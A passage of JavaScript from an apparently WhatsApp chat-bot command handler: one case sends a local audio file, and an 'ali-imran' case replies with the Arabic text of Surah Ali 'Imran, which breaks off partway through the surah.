 await Asepp.sendMessage(
 m.chat,
 {
 audio: fs.readFileSync("./image/kacaw.mp3"),
 mimetype: "audio/mp4",
 ptt: false
 },
 { quoted: m }
 )
}
break

case 'ali-imran':
case 'aliimran':
case 'al-imran':
case 'alimran': {
 await Asepp.sendMessage(m.chat, { react: { text: "📖", key: m.key } })

 let teks = `\`𝗦𝗨𝗥𝗔𝗧 𝗔𝗟𝗜 '𝗜𝗠𝗥𝗔𝗡\`
Surat ke-3 | 200 ayat | Madaniyah | Keluarga Imran

⌲ \`𝐓𝐄𝐊𝐒 𝐀𝐑𝐀𝐁 𝐋𝐄𝐍𝐆𝐊𝐀𝐏\`
بِسْمِ اللّٰهِ الرَّحْمٰنِ الرَّحِيْمِ
الٓمّٓۚ
اللّٰهُ لَآ اِلٰهَ اِلَّا هُوَۙ الْحَيُّ الْقَيُّوْمُۗ
نَزَّلَ عَلَيْكَ الْكِتٰبَ بِالْحَقِّ مُصَدِّقًا لِّمَا بَيْنَ يَدَيْهِ وَاَنْزَلَ التَّوْرٰىةَ وَالْاِنْجِيْلَۙ
مِنْ قَبْلُ هُدًى لِّلنَّاسِ وَاَنْزَلَ الْفُرْقَانَ ۗ اِنَّ الَّذِيْنَ كَفَرُوْا بِاٰيٰتِ اللّٰهِ لَهُمْ عَذَابٌ شَدِيْدٌ ۗ وَاللّٰهُ عَزِيْزٌ ذُو انْتِقَامٍ
اِنَّ اللّٰهَ لَا يَخْفٰى عَلَيْهِ شَيْءٌ فِى الْاَرْضِ وَلَا فِى السَّمَاۤءِ
هُوَ الَّذِيْ يُصَوِّرُكُمْ فِى الْاَرْحَامِ كَيْفَ يَشَاۤءُ ۗ لَآ اِلٰهَ اِلَّا هُوَ الْعَزِيْزُ الْحَكِيْمُ
هُوَ الَّذِيْٓ اَنْزَلَ عَلَيْكَ الْكِتٰبَ مِنْهُ اٰيٰتٌ مُّحْكَمٰتٌ هُنَّ اُمُّ الْكِتٰبِ وَاُخَرُ مُتَشٰبِهٰتٌ ۗ فَاَمَّا الَّذِيْنَ فِيْ قُلُوْبِهِمْ زَيْغٌ فَيَتَّبِعُوْنَ مَا تَشَابَهَ مِنْهُ ابْتِغَاۤءَ الْفِتْنَةِ وَابْتِغَاۤءَ تَأْوِيْلِهٖۚ وَمَا يَعْلَمُ تَأْوِيْلَهٗٓ اِلَّا اللّٰهُ ۘ وَالرّٰسِخُوْنَ فِى الْعِلْمِ يَقُوْلُوْنَ اٰمَنَّا بِهٖۙ كُلٌّ مِّنْ عِنْدِ رَبِّنَا ۚ وَمَا يَذَّكَّرُ اِلَّآ اُولُوا الْاَلْبَابِ
رَبَّنَا لَا تُزِغْ قُلُوْبَنَا بَعْدَ اِذْ هَدَيْتَنَا وَهَبْ لَنَا مِنْ لَّدُنْكَ رَحْمَةً ۚ اِنَّكَ اَنْتَ الْوَهَّابُ
رَبَّنَآ اِنَّكَ جَامِعُ النَّاسِ لِيَوْمٍ لَّا رَيْبَ فِيْهِ ۗ اِنَّ اللّٰهَ لَا يُخْلِفُ الْمِيْعَادَ
اِنَّ الَّذِيْنَ كَفَرُوْا لَنْ تُغْنِيَ عَنْهُمْ اَمْوَالُهُمْ وَلَآ اَوْلَادُهُمْ مِّنَ اللّٰهِ شَيْـًٔا ۗ وَاُولٰۤىِٕكَ هُمْ وَقُوْدُ النَّارِۙ
كَدَأْبِ اٰلِ فِرْعَوْنَۙ وَالَّذِيْنَ مِنْ قَبْلِهِمْ ۗ كَذَّبُوْا بِاٰيٰتِنَا ۚ فَاَخَذَهُمُ اللّٰهُ بِذُنُوْبِهِمْ ۗ وَاللّٰهُ شَدِيْدُ الْعِقَابِ
قُلْ لِّلَّذِيْنَ كَفَرُوْا سَتُغْلَبُوْنَ وَتُحْشَرُوْنَ اِلٰى جَهَنَّمَ ۗ وَبِئْسَ الْمِهَادُ
قَدْ كَانَ لَكُمْ اٰيَةٌ فِيْ فِئَتَيْنِ الْتَقَتَا ۗ فِئَةٌ تُقَاتِلُ فِيْ سَبِيْلِ اللّٰهِ وَاُخْرٰى كَافِرَةٌ يَّرَوْنَهُمْ مِّثْلَيْهِمْ رَأْيَ الْعَيْنِ ۗ وَاللّٰهُ يُؤَيِّدُ بِنَصْرِهٖ مَنْ يَّشَاۤءُ ۗ اِنَّ فِيْ ذٰلِكَ لَعِبْرَةً لِّاُولِى الْاَبْصَارِ
زُيِّنَ لِلنَّاسِ حُبُّ الشَّهَوٰتِ مِنَ النِّسَاۤءِ وَالْبَنِيْنَ وَالْقَنَاطِيْرِ الْمُقَنْطَرَةِ مِنَ الذَّهَبِ وَالْفِضَّةِ وَالْخَيْلِ الْمُسَوَّمَةِ وَالْاَنْعَامِ وَالْحَرْثِ ۗ ذٰلِكَ مَتَاعُ الْحَيٰوةِ الدُّنْيَا ۚ وَاللّٰهُ عِنْدَهٗ حُسْنُ الْمَاٰبِ
قُلْ اَؤُنَبِّئُكُمْ بِخَيْرٍ مِّنْ ذٰلِكُمْ ۗ لِلَّذِيْنَ اتَّقَوْا عِنْدَ رَبِّهِمْ جَنّٰتٌ تَجْرِيْ مِنْ تَحْتِهَا الْاَنْهٰرُ خٰلِدِيْنَ فِيْهَا وَاَزْوَاجٌ مُّطَهَّرَةٌ وَّرِضْوَانٌ مِّنَ اللّٰهِ ۗ وَاللّٰهُ بَصِيْرٌۢ بِالْعِبَادِۚ
اَلَّذِيْنَ يَقُوْلُوْنَ رَبَّنَآ اِنَّنَآ اٰمَنَّا فَاغْفِرْ لَنَا ذُنُوْبَنَا وَقِنَا عَذَابَ النَّارِۚ
اَلصّٰبِرِيْنَ وَالصّٰدِقِيْنَ وَالْقَانِتِيْنَ وَالْمُنْفِقِيْنَ وَالْمُسْتَغْفِرِيْنَ بِالْاَسْحَارِ
شَهِدَ اللّٰهُ اَنَّهٗ لَآ اِلٰهَ اِلَّا هُوَۙ وَالْمَلٰۤىِٕكَةُ وَاُولُوا الْعِلْمِ قَاۤىِٕمًا بِالْقِسْطِ ۗ لَآ اِلٰهَ اِلَّا هُوَ الْعَزِيْزُ الْحَكِيْمُ
اِنَّ الدِّيْنَ عِنْدَ اللّٰهِ الْاِسْلَامُ ۗ وَمَا اخْتَلَفَ الَّذِيْنَ اُوْتُوا الْكِتٰبَ اِلَّا مِنْۢ بَعْدِ مَا جَاۤءَهُمُ الْعِلْمُ بَغْيًاۢ بَيْنَهُمْ ۗ وَمَنْ يَّكْفُرْ بِاٰيٰتِ اللّٰهِ فَاِنَّ اللّٰهَ سَرِيْعُ الْحِسَابِ
فَاِنْ حَاۤجُّوْكَ فَقُلْ اَسْلَمْتُ وَجْهِيَ لِلّٰهِ وَمَنِ اتَّبَعَنِ ۗ وَقُلْ لِّلَّذِيْنَ اُوْتُوا الْكِتٰبَ وَالْاُمِّيّٖنَ ءَاَسْلَمْتُمْ ۗ فَاِنْ اَسْلَمُوْا فَقَدِ اهْتَدَوْا ۚ وَاِنْ تَوَلَّوْا فَاِنَّمَا عَلَيْكَ الْبَلٰغُ ۗ وَاللّٰهُ بَصِيْرٌۢ بِالْعِبَادِ
اِنَّ الَّذِيْنَ يَكْفُرُوْنَ بِاٰيٰتِ اللّٰهِ وَيَقْتُلُوْنَ النَّبِيّٖنَ بِغَيْرِ حَقٍّۙ وَّيَقْتُلُوْنَ الَّذِيْنَ يَأْمُرُوْنَ بِالْقِسْطِ مِنَ النَّاسِۙ فَبَشِّرْهُمْ بِعَذَابٍ اَلِيْمٍ
اُولٰۤىِٕكَ الَّذِيْنَ حَبِطَتْ اَعْمَالُهُمْ فِى الدُّنْيَا وَالْاٰخِرَةِ ۖ وَمَا لَهُمْ مِّنْ نّٰصِرِيْنَ
اَلَمْ تَرَ اِلَى الَّذِيْنَ اُوْتُوْا نَصِيْبًا مِّنَ الْكِتٰبِ يُدْعَوْنَ اِلٰى كِتٰبِ اللّٰهِ لِيَحْكُمَ بَيْنَهُمْ ثُمَّ يَتَوَلّٰى فَرِيْقٌ مِّنْهُمْ وَهُمْ مُّعْرِضُوْنَ
ذٰلِكَ بِاَنَّهُمْ قَالُوْا لَنْ تَمَسَّنَا النَّارُ اِلَّآ اَيَّامًا مَّعْدُوْدٰتٍ ۖ وَغَرَّهُمْ فِيْ دِيْنِهِمْ مَّا كَانُوْا يَفْتَرُوْنَ
فَكَيْفَ اِذَا جَمَعْنٰهُمْ لِيَوْمٍ لَّا رَيْبَ فِيْهِ ۖ وَوُفِّيَتْ كُلُّ نَفْسٍ مَّا كَسَبَتْ وَهُمْ لَا يُظْلَمُوْنَ
قُلِ اللّٰهُمَّ مٰلِكَ الْمُلْكِ تُؤْتِى الْمُلْكَ مَنْ تَشَاۤءُ وَتَنْزِعُ الْمُلْكَ مِمَّنْ تَشَاۤءُ ۖ وَتُعِزُّ مَنْ تَشَاۤءُ وَتُذِلُّ مَنْ تَشَاۤءُ ۗ بِيَدِكَ الْخَيْرُ ۗ اِنَّكَ عَلٰى كُلِّ شَيْءٍ قَدِيْرٌ
تُوْلِجُ الَّيْلَ فِى النَّهَارِ وَتُوْلِجُ النَّهَارَ فِى الَّيْلِ ۖ وَتُخْرِجُ الْحَيَّ مِنَ الْمَيِّتِ وَتُخْرِجُ الْمَيِّتَ مِنَ الْحَيِّ ۖ وَتَرْزُقُ مَنْ تَشَاۤءُ بِغَيْرِ حِسَابٍ
لَا يَتَّخِذِ الْمُؤْمِنُوْنَ الْكٰفِرِيْنَ اَوْلِيَاۤءَ مِنْ دُوْنِ الْمُؤْمِنِيْنَ ۚ وَمَنْ يَّفْعَلْ ذٰلِكَ فَلَيْسَ مِنَ اللّٰهِ فِيْ شَيْءٍ اِلَّآ اَنْ تَتَّقُوْا مِنْهُمْ تُقٰىةً ۗ وَيُحَذِّرُكُمُ اللّٰهُ نَفْسَهٗ ۗ وَاِلَى اللّٰهِ الْمَصِيْرُ
قُلْ اِنْ تُخْفُوْا مَا فِيْ صُدُوْرِكُمْ اَوْ تُبْدُوْهُ يَعْلَمْهُ اللّٰهُ ۗ وَيَعْلَمُ مَا فِى السَّمٰوٰتِ وَمَا فِى الْاَرْضِ ۗ وَاللّٰهُ عَلٰى كُلِّ شَيْءٍ قَدِيْرٌ
يَوْمَ تَجِدُ كُلُّ نَفْسٍ مَّا عَمِلَتْ مِنْ خَيْرٍ مُّحْضَرًاۛ وَّمَا عَمِلَتْ مِنْ سُوْۤءٍۚ تَوَدُّ لَوْ اَنَّ بَيْنَهَا وَبَيْنَهٗٓ اَمَدًاۢ بَعِيْدًا ۗ وَيُحَذِّرُكُمُ اللّٰهُ نَفْسَهٗ ۗ وَاللّٰهُ رَءُوْفٌۢ بِالْعِبَادِ
قُلْ اِنْ كُنْتُمْ تُحِبُّوْنَ اللّٰهَ فَاتَّبِعُوْنِيْ يُحْبِبْكُمُ اللّٰهُ وَيَغْفِرْ لَكُمْ ذُنُوْبَكُمْ ۗ وَاللّٰهُ غَفُوْرٌ رَّحِيْمٌ
قُلْ اَطِيْعُوا اللّٰهَ وَالرَّسُوْلَ ۚ فَاِنْ تَوَلَّوْا فَاِنَّ اللّٰهَ لَا يُحِبُّ الْكٰفِرِيْنَ
اِنَّ اللّٰهَ اصْطَفٰٓى اٰدَمَ وَنُوْحًا وَّاٰلَ اِبْرٰهِيْمَ وَاٰلَ عِمْرٰنَ عَلَى الْعٰلَمِيْنَۙ
ذُرِّيَّةًۢ بَعْضُهَا مِنْۢ بَعْضٍ ۗ وَاللّٰهُ سَمِيْعٌ عَلِيْمٌ
اِذْ قَالَتِ امْرَاَتُ عِمْرٰنَ رَبِّ اِنِّيْ نَذَرْتُ لَكَ مَا فِيْ بَطْنِيْ مُحَرَّرًا فَتَقَبَّلْ مِنِّيْ ۚ اِنَّكَ اَنْتَ السَّمِيْعُ الْعَلِيْمُ
فَلَمَّا وَضَعَتْهَا قَالَتْ رَبِّ اِنِّيْ وَضَعْتُهَآ اُنْثٰى ۚ وَاللّٰهُ اَعْلَمُ بِمَا وَضَعَتْ ۗ وَلَيْسَ الذَّكَرُ كَالْاُنْثٰى ۚ وَاِنِّيْ سَمَّيْتُهَا مَرْيَمَ وَاِنِّيْٓ اُعِيْذُهَا بِكَ وَذُرِّيَّتَهَا مِنَ الشَّيْطٰنِ الرَّجِيْمِ
فَتَقَبَّلَهَا رَبُّهَا بِقَبُوْلٍ حَسَنٍ وَّاَنْۢبَتَهَا نَبَاتًا حَسَنًا ۙ وَّكَفَّلَهَا زَكَرِيَّا ۗ كُلَّمَا دَخَلَ عَلَيْهَا زَكَرِيَّا الْمِحْرَابَ وَجَدَ عِنْدَهَا رِزْقًا ۚ قَالَ يٰمَرْيَمُ اَنّٰى لَكِ هٰذَا ۗ قَالَتْ هُوَ مِنْ عِنْدِ اللّٰهِ ۗ اِنَّ اللّٰهَ يَرْزُقُ مَنْ يَّشَاۤءُ بِغَيْرِ حِسَابٍ
هُنَالِكَ دَعَا زَكَرِيَّا رَبَّهٗ ۚ قَالَ رَبِّ هَبْ لِيْ مِنْ لَّدُنْكَ ذُرِّيَّةً طَيِّبَةً ۚ اِنَّكَ سَمِيْعُ الدُّعَاۤءِ
فَنَادَتْهُ الْمَلٰۤىِٕكَةُ وَهُوَ قَاۤىِٕمٌ يُّصَلِّيْ فِى الْمِحْرَابِ ۙ اَنَّ اللّٰهَ يُبَشِّرُكَ بِيَحْيٰى مُصَدِّقًا بِكَلِمَةٍ مِّنَ اللّٰهِ وَسَيِّدًا وَّحَصُوْرًا وَّنَبِيًّا مِّنَ الصّٰلِحِيْنَ
قَالَ رَبِّ اَنّٰى يَكُوْنُ لِيْ غُلٰمٌ وَّقَدْ بَلَغَنِيَ الْكِبَرُ وَامْرَاَتِيْ عَاقِرٌ ۗ قَالَ كَذٰلِكَ اللّٰهُ يَفْعَلُ مَا يَشَاۤءُ
قَالَ رَبِّ اجْعَلْ لِّيْٓ اٰيَةً ۗ قَالَ اٰيَتُكَ اَلَّا تُكَلِّمَ النَّاسَ ثَلٰثَةَ اَيَّامٍ اِلَّا رَمْزًا ۗ وَاذْكُرْ رَّبَّكَ كَثِيْرًا وَّسَبِّحْ بِالْعَشِيِّ وَالْاِبْكَارِ
وَاِذْ قَالَتِ الْمَلٰۤىِٕكَةُ يٰمَرْيَمُ اِنَّ اللّٰهَ اصْطَفٰىكِ وَطَهَّرَكِ وَاصْطَفٰىكِ عَلٰى نِسَاۤءِ الْعٰلَمِيْنَ
يٰمَرْيَمُ اقْنُتِيْ لِرَبِّكِ وَاسْجُدِيْ وَارْكَعِيْ مَعَ الرّٰكِعِيْنَ
ذٰلِكَ مِنْ اَنْۢبَاۤءِ الْغَيْبِ نُوْحِيْهِ اِلَيْكَ ۗ وَمَا كُنْتَ لَدَيْهِمْ اِذْ يُلْقُوْنَ اَقْلَامَهُمْ اَيُّهُمْ يَكْفُلُ مَرْيَمَ ۖ وَمَا كُنْتَ لَدَيْهِمْ اِذْ يَخْتَصِمُوْنَ
اِذْ قَالَتِ الْمَلٰۤىِٕكَةُ يٰمَرْيَمُ اِنَّ اللّٰهَ يُبَشِّرُكِ بِكَلِمَةٍ مِّنْهُ ۖ اسْمُهُ الْمَسِيْحُ عِيْسَى ابْنُ مَرْيَمَ وَجِيْهًا فِى الدُّنْيَا وَالْاٰخِرَةِ وَمِنَ الْمُقَرَّبِيْنَ
وَيُكَلِّمُ النَّاسَ فِى الْمَهْدِ وَكَهْلًا وَّمِنَ الصّٰلِحِيْنَ
قَالَتْ رَبِّ اَنّٰى يَكُوْنُ لِيْ وَلَدٌ وَّلَمْ يَمْسَسْنِيْ بَشَرٌ ۗ قَالَ كَذٰلِكِ اللّٰهُ يَخْلُقُ مَا يَشَاۤءُ ۗ اِذَا قَضٰٓى اَمْرًا فَاِنَّمَا يَقُوْلُ لَهٗ كُنْ فَيَكُوْنُ
وَيُعَلِّمُهُ الْكِتٰبَ وَالْحِكْمَةَ وَالتَّوْرٰىةَ وَالْاِنْجِيْلَ
وَرَسُوْلًا اِلٰى بَنِيْٓ اِسْرَاۤءِيْلَۙ اَنِّيْ قَدْ جِئْتُكُمْ بِاٰيَةٍ مِّنْ رَّبِّكُمْ ۙ اَنِّيْٓ اَخْلُقُ لَكُمْ مِّنَ الطِّيْنِ كَهَيْـَٔةِ الطَّيْرِ فَاَنْفُخُ فِيْهِ فَيَكُوْنُ طَيْرًاۢ بِاِذْنِ اللّٰهِ ۚ وَاُبْرِئُ الْاَكْمَهَ وَالْاَبْرَصَ وَاُحْيِ الْمَوْتٰى بِاِذْنِ اللّٰهِ ۚ وَاُنَبِّئُكُمْ بِمَا تَأْكُلُوْنَ وَمَا تَدَّخِرُوْنَۙ فِيْ بُيُوْتِكُمْ ۗ اِنَّ فِيْ ذٰلِكَ لَاٰيَةً لَّكُمْ اِنْ كُنْتُمْ مُّؤْمِنِيْنَ
وَمُصَدِّقًا لِّمَا بَيْنَ يَدَيَّ مِنَ التَّوْرٰىةِ وَلِاُحِلَّ لَكُمْ بَعْضَ الَّذِيْ حُرِّمَ عَلَيْكُمْ ۚ وَجِئْتُكُمْ بِاٰيَةٍ مِّنْ رَّبِّكُمْ ۚ فَاتَّقُوا اللّٰهَ وَاَطِيْعُوْنِ
اِنَّ اللّٰهَ رَبِّيْ وَرَبُّكُمْ فَاعْبُدُوْهُ ۗ هٰذَا صِرَاطٌ مُّسْتَقِيْمٌ
فَلَمَّآ اَحَسَّ عِيْسٰى مِنْهُمُ الْكُفْرَ قَالَ مَنْ اَنْصَارِيْٓ اِلَى اللّٰهِ ۗ قَالَ الْحَوَارِيُّوْنَ نَحْنُ اَنْصَارُ اللّٰهِ ۚ اٰمَنَّا بِاللّٰهِ ۚ وَاشْهَدْ بِاَنَّا مُسْلِمُوْنَ
رَبَّنَآ اٰمَنَّا بِمَآ اَنْزَلْتَ وَاتَّبَعْنَا الرَّسُوْلَ فَاكْتُبْنَا مَعَ الشّٰهِدِيْنَ
وَمَكَرُوْا وَمَكَرَ اللّٰهُ ۗ وَاللّٰهُ خَيْرُ الْمٰكِرِيْنَ
اِذْ قَالَ اللّٰهُ يٰعِيْسٰىٓ اِنِّيْ مُتَوَفِّيْكَ وَرَافِعُكَ اِلَيَّ وَمُطَهِّرُكَ مِنَ الَّذِيْنَ كَفَرُوْا وَجَاعِلُ الَّذِيْنَ اتَّبَعُوْكَ فَوْقَ الَّذِيْنَ كَفَرُوْٓا اِلٰى يَوْمِ الْقِيٰمَةِ ۚ ثُمَّ اِلَيَّ مَرْجِعُكُمْ فَاَحْكُمُ بَيْنَكُمْ فِيْمَا كُنْتُمْ فِيْهِ تَخْتَلِفُوْنَ
فَاَمَّا الَّذِيْنَ كَفَرُوْا فَاُعَذِّبُهُمْ عَذَابًا شَدِيْدًا فِى الدُّنْيَا وَالْاٰخِرَةِ ۖ وَمَا لَهُمْ مِّنْ نّٰصِرِيْنَ
وَاَمَّا الَّذِيْنَ اٰمَنُوْا وَعَمِلُوا الصّٰلِحٰتِ فَيُوَفِّيْهِمْ اُجُوْرَهُمْ ۗ وَاللّٰهُ لَا يُحِبُّ الظّٰلِمِيْنَ
ذٰلِكَ نَتْلُوْهُ عَلَيْكَ مِنَ الْاٰيٰتِ وَالذِّكْرِ الْحَكِيْمِ
اِنَّ مَثَلَ عِيْسٰى عِنْدَ اللّٰهِ كَمَثَلِ اٰدَمَ ۗ خَلَقَهٗ مِنْ تُرَابٍ ثُمَّ قَالَ لَهٗ كُنْ فَيَكُوْنُ
اَلْحَقُّ مِنْ رَّبِّكَ فَلَا تَكُنْ مِّنَ الْمُمْتَرِيْنَ
فَمَنْ حَاۤجَّكَ فِيْهِ مِنْۢ بَعْدِ مَا جَاۤءَكَ مِنَ الْعِلْمِ فَقُلْ تَعَالَوْا نَدْعُ اَبْنَاۤءَنَا وَاَبْنَاۤءَكُمْ وَنِسَاۤءَنَا وَنِسَاۤءَكُمْ وَاَنْفُسَنَا وَاَنْفُسَكُمْ ۗ ثُمَّ نَبْتَهِلْ فَنَجْعَلْ لَّعْنَتَ اللّٰهِ عَلَى الْكٰذِبِيْنَ
اِنَّ هٰذَا لَهُوَ الْقَصُ الْحَقُّ ۚ وَمَا مِنْ اِلٰهٍ اِلَّا اللّٰهُ ۗ وَاِنَّ اللّٰهَ لَهُوَ الْعَزِيْزُ الْحَكِيْمُ
فَاِنْ تَوَلَّوْا فَاِنَّ اللّٰهَ عَلِيْمٌۢ بِالْمُفْسِدِيْنَ
قُلْ يٰٓاَهْلَ الْكِتٰبِ تَعَالَوْا اِلٰى كَلِمَةٍ سَوَاۤءٍۢ بَيْنَنَا وَبَيْنَكُمْ اَلَّا نَعْبُدَ اِلَّا اللّٰهَ وَلَا نُشْرِكَ بِهٖ شَيْـًٔا وَّلَا يَتَّخِذَ بَعْضُنَا بَعْضًا اَرْبَابًا مِّنْ دُوْنِ اللّٰهِ ۗ فَاِنْ تَوَلَّوْا فَقُوْلُوا اشْهَدُوْا بِاَنَّا مُسْلِمُوْنَ
يٰٓاَهْلَ الْكِتٰبِ لِمَ تُحَاۤجُّوْنَ فِيْٓ اِبْرٰهِيْمَ وَمَآ اُنْزِلَتِ التَّوْرٰىةُ وَالْاِنْجِيْلُ اِلَّا مِنْۢ بَعْدِهٖ ۗ اَفَلَا تَعْقِلُوْنَ
هٰٓاَنْتُمْ هٰٓؤُلَاۤءِ حَاجَجْتُمْ فِيْمَا لَكُمْ بِهٖ عِلْمٌ فَلِمَ تُحَاۤجُّوْنَ فِيْمَا لَيْسَ لَكُمْ بِهٖ عِلْمٌ ۗ وَاللّٰهُ يَعْلَمُ وَاَنْتُمْ لَا تَعْلَمُوْنَ
مَا كَانَ اِبْرٰهِيْمُ يَهُوْدِيًّا وَّلَا نَصْرَانِيًّا وَّلٰكِنْ كَانَ حَنِيْفًا مُّسْلِمًا ۗ وَمَا كَانَ مِنَ الْمُشْرِكِيْنَ
اِنَّ اَوْلَى النَّاسِ بِاِبْرٰهِيْمَ لَلَّذِيْنَ اتَّبَعُوْهُ وَهٰذَا النَّبِيُّ وَالَّذِيْنَ اٰمَنُوْا ۗ وَاللّٰهُ وَلِيُّ الْمُؤْمِنِيْنَ
وَدَّتْ طَّاۤىِٕفَةٌ مِّنْ اَهْلِ الْكِتٰبِ لَوْ يُضِلُّوْنَكُمْ ۗ وَمَا يُضِلُّوْنَ اِلَّآ اَنْفُسَهُمْ وَمَا يَشْعُرُوْنَ
يٰٓاَهْلَ الْكِتٰبِ لِمَ تَكْفُرُوْنَ بِاٰيٰتِ اللّٰهِ وَاَنْتُمْ تَشْهَدُوْنَ
يٰٓاَهْلَ الْكِتٰبِ لِمَ تَلْبِسُوْنَ الْحَقَّ بِالْبَاطِلِ وَتَكْتُمُوْنَ الْحَقَّ وَاَنْتُمْ تَعْلَمُوْنَ
وَقَالَتْ طَّاۤىِٕفَةٌ مِّنْ اَهْلِ الْكِتٰبِ اٰمِنُوْا بِالَّذِيْٓ اُنْزِلَ عَلَى الَّذِيْنَ اٰمَنُوْا وَجْهَ النَّهَارِ وَاكْفُرُوْٓا اٰخِرَهٗ لَعَلَّهُمْ يَرْجِعُوْنَ
وَلَا تُؤْمِنُوْٓا اِلَّا لِمَنْ تَبِعَ دِيْنَكُمْ ۗ قُلْ اِنَّ الْهُدٰى هُدَى اللّٰهِ ۙ اَنْ يُّؤْتٰٓى اَحَدٌ مِّثْلَ مَآ اُوْتِيْتُمْ اَوْ يُحَاۤجُّوْكُمْ عِنْدَ رَبِّكُمْ ۗ قُلْ اِنَّ الْفَضْلَ بِيَدِ اللّٰهِ ۚ يُؤْتِيْهِ مَنْ يَّشَاۤءُ ۗ وَاللّٰهُ وَاسِعٌ عَلِيْمٌ
يَخْتَصُّ بِرَحْمَتِهٖ مَنْ يَّشَاۤءُ ۗ وَاللّٰهُ ذُو الْفَضْلِ الْعَظِيْمِ
وَمِنْ اَهْلِ الْكِتٰبِ مَنْ اِنْ تَأْمَنْهُ بِقِنْطَارٍ يُّؤَدِّهٖٓ اِلَيْكَ ۚ وَمِنْهُمْ مَّنْ اِنْ تَأْمَنْهُ بِدِيْنَارٍ لَّا يُؤَدِّهٖٓ اِلَيْكَ اِلَّا مَا دُمْتَ عَلَيْهِ قَاۤىِٕمًا ۗ ذٰلِكَ بِاَنَّهُمْ قَالُوْا لَيْسَ عَلَيْنَا فِى الْاُمِّيّٖنَ سَبِيْلٌ ۚ وَيَقُوْلُوْنَ عَلَى اللّٰهِ الْكَذِبَ وَهُمْ يَعْلَمُوْنَ
بَلٰى مَنْ اَوْفٰى بِعَهْدِهٖ وَاتَّقٰى فَاِنَّ اللّٰهَ يُحِبُّ الْمُتَّقِيْنَ
اِنَّ الَّذِيْنَ يَشْتَرُوْنَ بِعَهْدِ اللّٰهِ وَاَيْمَانِهِمْ ثَمَنًا قَلِيْلًا اُولٰۤىِٕكَ لَا خَلَاقَ لَهُمْ فِى الْاٰخِرَةِ وَلَا يُكَلِّمُهُمُ اللّٰهُ وَلَا يَنْظُرُ اِلَيْهِمْ يَوْمَ الْقِيٰمَةِ وَلَا يُزَكِّيْهِمْ ۖ وَلَهُمْ عَذَابٌ اَلِيْمٌ
وَاِنَّ مِنْهُمْ لَفَرِيْقًا يَّلْوٗنَ اَلْسِنَتَهُمْ بِالْكِتٰبِ لِتَحْسَبُوْهُ مِنَ الْكِتٰبِ وَمَا هُوَ مِنَ الْكِتٰبِ ۚ وَيَقُوْلُوْنَ هُوَ مِنْ عِنْدِ اللّٰهِ ۖ وَمَا هُوَ مِنْ عِنْدِ اللّٰهِ ۚ وَيَقُوْلُوْنَ عَلَى اللّٰهِ الْكَذِبَ وَهُمْ يَعْلَمُوْنَ
مَا كَانَ لِبَشَرٍ اَنْ يُّؤْتِيَهُ اللّٰهُ الْكِتٰبَ وَالْحُكْمَ وَالنُّبُوَّةَ ثُمَّ يَقُوْلَ لِلنَّاسِ كُوْنُوْا عِبَادًا لِّيْ مِنْ دُوْنِ اللّٰهِ وَلٰكِنْ كُوْنُوْا رَبّٰنِيّٖنَ بِمَا كُنْتُمْ تُعَلِّمُوْنَ الْكِتٰبَ وَبِمَا كُنْتُمْ تَدْرُسُوْنَ
وَلَا يَأْمُرَكُمْ اَنْ تَتَّخِذُوا الْمَلٰۤىِٕكَةَ وَالنَّبِيّٖنَ اَرْبَابًا ۗ اَيَأْمُرُكُمْ بِالْكُفْرِ بَعْدَ اِذْ اَنْتُمْ مُّسْلِمُوْنَ
وَاِذْ اَخَذَ اللّٰهُ مِيْثَاقَ النَّبِيّٖنَ لَمَآ اٰتَيْتُكُمْ مِّنْ كِتٰبٍ وَّحِكْمَةٍ ثُمَّ جَاۤءَكُمْ رَسُوْلٌ مُّصَدِّقٌ لِّمَا مَعَكُمْ لَتُؤْمِنُنَّ بِهٖ وَلَتَنْصُرُنَّهٗ ۗ قَالَ ءَاَقْرَرْتُمْ وَاَخَذْتُمْ عَلٰى ذٰلِكُمْ اِصْرِيْ ۗ قَالُوْٓا اَقْرَرْنَا ۗ قَالَ فَاشْهَدُوْا وَاَنَا مَعَكُمْ مِّنَ الشّٰهِدِيْنَ
فَمَنْ تَوَلّٰى بَعْدَ ذٰلِكَ فَاُولٰۤىِٕكَ هُمُ الْفٰسِقُوْنَ
اَفَغَيْرَ دِيْنِ اللّٰهِ يَبْغُوْنَ وَلَهٗٓ اَسْلَمَ مَنْ فِى السَّمٰوٰتِ وَالْاَرْضِ طَوْعًا وَّكَرْهًا وَّاِلَيْهِ يُرْجَعُوْنَ
قُلْ اٰمَنَّا بِاللّٰهِ وَمَآ اُنْزِلَ عَلَيْنَا وَمَآ اُنْزِلَ عَلٰٓى اِبْرٰهِيْمَ وَاِسْمٰعِيْلَ وَاِسْحٰقَ وَيَعْقُوْبَ وَالْاَسْبَاطِ وَمَآ اُوْتِيَ مُوْسٰى وَعِيْسٰى وَالنَّبِيُّوْنَ مِنْ رَّبِّهِمْ ۖ لَا نُفَرِّقُ بَيْنَ اَحَدٍ مِّنْهُمْ ۖ وَنَحْنُ لَهٗ مُسْلِمُوْنَ
وَمَنْ يَّبْتَغِ غَيْرَ الْاِسْلَامِ دِيْنًا فَلَنْ يُّقْبَلَ مِنْهُ ۚ وَهُوَ فِى الْاٰخِرَةِ مِنَ الْخٰسِرِيْنَ
كَيْفَ يَهْدِى اللّٰهُ قَوْمًا كَفَرُوْا بَعْدَ اِيْمَانِهِمْ وَشَهِدُوْٓا اَنَّ الرَّسُوْلَ حَقٌّ وَّجَاۤءَهُمُ الْبَيِّنٰتُ ۗ وَاللّٰهُ لَا يَهْدِى الْقَوْمَ الظّٰلِمِيْنَ
اُولٰۤىِٕكَ جَزَاۤؤُهُمْ اَنَّ عَلَيْهِمْ لَعْنَةَ اللّٰهِ وَالْمَلٰۤىِٕكَةِ وَالنَّاسِ اَجْمَعِيْنَۙ
خٰلِدِيْنَ فِيْهَا ۚ لَا يُخَفَّفُ عَنْهُمُ الْعَذَابُ وَلَا هُمْ يُنْظَرُوْنَۙ
اِلَّا الَّذِيْنَ تَابُوْا مِنْۢ بَعْدِ ذٰلِكَ وَاَصْلَحُوْا ۖ فَاِنَّ اللّٰهَ غَفُوْرٌ رَّحِيْمٌ
اِنَّ الَّذِيْنَ كَفَرُوْا بَعْدَ اِيْمَانِهِمْ ثُمَّ ازْدَادُوْا كُفْرًا لَّنْ تُقْبَلَ تَوْبَتُهُمْ ۚ وَاُولٰۤىِٕكَ هُمُ الضَّاۤلُّوْنَ
